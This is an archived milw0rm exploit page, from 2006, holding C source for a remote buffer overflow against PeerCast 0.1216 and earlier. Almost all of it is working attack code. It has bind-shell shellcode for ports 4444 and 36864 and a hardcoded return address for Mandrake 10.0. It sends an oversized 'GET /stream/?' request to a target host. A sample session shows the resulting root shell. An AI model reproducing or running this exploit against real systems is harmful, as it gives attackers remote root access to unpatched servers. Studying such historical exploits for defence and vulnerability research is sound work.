<html><head><title>PeerCast <= 0.1216 (nextCGIarg) Remote Buffer Overflow Exploit (2)</title></head><pre>/*
\		PeerCast &lt;=0.1216 remote exploit
/			by Darkeagle
\	
/	09.03.06
\
/
\	gr33tz: bl4ck guys, unl0ck guys, rst/ghc guys, 0x557 guys, ph4nt0m guys, sh0k and many otherz.
/
\
/ http://unl0ck.net

*******************************************
root@localhost darkeagle]# telnet localhost 36864
Trying 127.0.0.1...
Connected to localhost (127.0.0.1).
Escape character is '^]'.
id;
uid=0(root) gid=0(root) groups=0(root)
: command not found
uname -a;
Linux localhost 2.6.3-7mdk #1 Wed Mar 17 15:56:42 CET 2004 i686 unknown unknown GNU/Linux
: command not found
*******************************************

Special tnx goes to: Dr_UF0 for targets support :)

\
/
\
*/

#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;netdb.h&gt;
#include &lt;arpa/inet.h&gt;
#include &lt;unistd.h&gt;


char scode[]= // binds 4444 port
&quot;\x31\xc9\x83\xe9\xeb\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x85&quot;
&quot;\x4f\xca\xdf\x83\xeb\xfc\xe2\xf4\xb4\x94\x99\x9c\xd6\x25\xc8\xb5&quot;
&quot;\xe3\x17\x53\x56\x64\x82\x4a\x49\xc6\x1d\xac\xb7\x94\x13\xac\x8c&quot;
&quot;\x0c\xae\xa0\xb9\xdd\x1f\x9b\x89\x0c\xae\x07\x5f\x35\x29\x1b\x3c&quot;
&quot;\x48\xcf\x98\x8d\xd3\x0c\x43\x3e\x35\x29\x07\x5f\x16\x25\xc8\x86&quot;
&quot;\x35\x70\x07\x5f\xcc\x36\x33\x6f\x8e\x1d\xa2\xf0\xaa\x3c\xa2\xb7&quot;
&quot;\xaa\x2d\xa3\xb1\x0c\xac\x98\x8c\x0c\xae\x07\x5f&quot;;

char linuxshellcode[]= // binds 36864 port
	&quot;\xeb\x6e\x5e\x29\xc0\x89\x46\x10&quot;
	&quot;\x40\x89\xc3\x89\x46\x0c\x40\x89&quot;	 
	&quot;\x46\x08\x8d\x4e\x08\xb0\x66\xcd&quot;
	&quot;\x80\x43\xc6\x46\x10\x10\x88\x46&quot;
	&quot;\x08\x31\xc0\x31\xd2\x89\x46\x18&quot;
	&quot;\xb0\x90\x66\x89\x46\x16\x8d\x4e&quot;
	&quot;\x14\x89\x4e\x0c\x8d\x4e\x08\xb0&quot;
	&quot;\x66\xcd\x80\x89\x5e\x0c\x43\x43&quot;
	&quot;\xb0\x66\xcd\x80\x89\x56\x0c\x89&quot;
	&quot;\x56\x10\xb0\x66\x43\xcd\x80\x86&quot;
	&quot;\xc3\xb0\x3f\x29\xc9\xcd\x80\xb0&quot;
	&quot;\x3f\x41\xcd\x80\xb0\x3f\x41\xcd&quot;
	&quot;\x80\x88\x56\x07\x89\x76\x0c\x87&quot;
	&quot;\xf3\x8d\x4b\x0c\xb0\x0b\xcd\x80&quot;
	&quot;\xe8\x8d\xff\xff\xff\x2f\x62\x69&quot;
	&quot;\x6e\x2f\x73\x68&quot;;



void usage(char *proga)
{
	printf(&quot;usage&gt; %s &lt;ipaddr&gt; &lt;port&gt;\n&quot;, proga);
}

int main( int argc, char *argv[] )
{
int sock;
struct sockaddr_in addr;
char evil[1024], get[1024];

long retaddr = 0x438a3e3c; // mandrake 10.0 rus - peercast 0.1211.tgz


system(&quot;clear&quot;);
printf(&quot;.::: PeerCast &lt;= 0.1215 remote exploit :::.\n&quot;);
printf(&quot;                 by Darkeagle              \n\n&quot;);
printf(&quot; bug founder: Leon Juranic\n&quot;);
printf(&quot;\n keep private!!!\n&quot;);

if ( argc &lt; 3 )
{
usage(argv[0]);
exit(0);
}

sock = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);

addr.sin_family = AF_INET;
addr.sin_port = htons(atoi(argv[2]));
addr.sin_addr.s_addr = inet_addr(argv[1]);

printf(&quot;\nexp&gt; connecting...\n&quot;);

if ( connect(sock, (struct sockaddr*)&amp;addr, sizeof(addr)) != 0 )
{
printf(&quot;exp&gt; connection failed\n&quot;);
exit(0);
}

printf(&quot;exp&gt; connection enstabilished!\n&quot;);

memset(evil, 0x00, 1024);
memset(get, 0x00, 1024);
memset(evil, 0x55, 800);
//memcpy(evil+strlen(evil), &amp;scode, sizeof(scode));
memcpy(evil+strlen(evil), &amp;linuxshellcode, sizeof(linuxshellcode));

strcpy(get, &quot;GET /stream/?&quot;);

*(long*)&amp;evil[780] = retaddr;
strcat(evil, &quot;\r\n\r\n&quot;);
strcat(get, evil);

sleep(1);
printf(&quot;exp&gt; sending evil data\n&quot;);
send(sock, get, strlen(get), 0);
printf(&quot;exp&gt; done!\n&quot;);
printf(&quot;exp&gt; check shell\n&quot;);
close(sock);
return 0;
}

// milw0rm.com [2006-03-12]</pre></html>